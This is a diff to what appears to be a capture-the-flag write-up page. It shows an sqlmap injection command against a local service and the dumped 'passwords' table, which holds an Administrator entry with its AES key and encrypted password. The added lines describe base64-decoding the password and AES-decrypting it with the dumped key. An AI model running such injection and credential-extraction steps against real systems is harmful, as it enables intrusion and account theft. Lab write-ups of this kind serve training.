@@ -176,6 +176,10 @@ published: true
 
 <pre><span class="line">sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&amp;username\=administrator\&amp;table\=passwords --dump</span><br><span class="line"></span><br><span class="line">Database: bread</span><br><span class="line">Table: passwords</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| id | account       | aes_key          | password                                     |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| 1  | Administrator | k19D193j.&lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br></pre>
 
+<p>Now we need to decrypt the password</p>
+<p>So we need to use base64 decode and after that we need to use aes decrypt with the key we got</p>
+<br>
+<p>You can use this link to decrypt it</p>
 
 
 
